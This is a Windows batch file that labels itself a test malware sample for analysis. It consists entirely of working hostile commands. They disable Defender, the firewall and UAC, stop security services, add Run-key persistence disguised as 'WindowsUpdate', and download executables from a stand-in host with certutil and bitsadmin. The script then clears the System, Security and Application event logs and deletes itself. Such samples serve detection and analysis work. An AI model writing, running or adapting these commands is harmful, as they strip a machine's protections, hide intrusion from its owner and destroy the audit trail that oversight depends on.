@echo off
:: This is a test malicious batch file for demonstration purposes.
:: DO NOT EXECUTE THIS FILE! It's for analysis testing only.
:: This file contains examples of techniques used in actual malware.

setlocal enabledelayedexpansion

:: Obfuscated variable technique
set a=po
set b=wer
set c=sh
set d=ell
set cmd=%a%%b%%c%%d%

:: Attempting to disable security tools
%cmd% -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
netsh firewall set opmode disable
sc stop WinDefend
net stop "Windows Defender Service"
net stop "Security Center"

:: Command chaining for obfuscation
reg^
 add^
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run^
 /v^
 "WindowsUpdate"^
 /t^
 REG_SZ^
 /d^
 "%~f0"^
 /f

:: Base64 encoded command example (this would decode to a harmless 'echo test')
%cmd% -enc ZQBjAGgAbwAgAHQAZQBzAHQA

:: Download and execute technique
certutil -urlcache -split -f http://example.com/malware.exe %temp%\update.exe
bitsadmin /transfer myJob /download /priority high http://example.com/payload.exe %temp%\system32.exe

:: UAC bypass attempt via registry
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

:: Delete evidence
del %temp%\*.* /f /s /q
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

:: Self-delete mechanism (would delete this script after execution)
if "%~1"=="" (
    start "" cmd /c %0 del
    exit /b
)
if "%~1"=="del" (
    ping -n 3 127.0.0.1 > nul
    del %~f0
    exit /b
)

echo Infection complete!
ping -n 5 127.0.0.1 > nul
exit 